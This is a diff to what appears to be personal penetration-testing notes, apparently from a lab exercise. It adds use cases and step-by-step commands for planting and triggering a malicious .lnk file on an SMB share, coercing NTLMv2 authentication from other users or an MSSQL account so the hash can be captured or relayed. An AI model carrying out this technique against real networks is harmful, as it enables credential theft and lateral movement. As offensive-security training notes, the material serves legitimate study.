@@ -1,3 +1,7 @@
+Use cases : 
+
+1.  Even though I already have RCE as Eric.Wallows, maybe Eric.Wallows has read and write access to share "Apps". But another user Jane.Borrows could also access this file. So she may be able to trigger this lnk and send the authentication through [[SMB NTLMv2 Relay]] and we get access as Jane.Borrows 
+2. MSSQL may be able to exec_dirtree my SMB share and we authenticate as MSSQL account
 
 Create vault.lnk
 ```dataviewjs
@@ -35,6 +39,35 @@ prompt OFF
 ```
 mput *
 ```
+
+---
+# Trigger the lnk
+
+
+
+### **1. Connect to the share**
+
+```
+net use Z: \\192.168.245.173\Apps
+```
+
+If you're already authenticated as Eric and have share permissions, it should use your current credentials.
+
+### **2. Browse the share**
+
+```
+dir Z:\
+```
+
+You should see the LNK you uploaded.
+
+### **3. Trigger the LNK**
+
+```
+explorer.exe Z:\test.lnk
+```
+
+---
 
 Go back on SMB server output to copy the hash
 
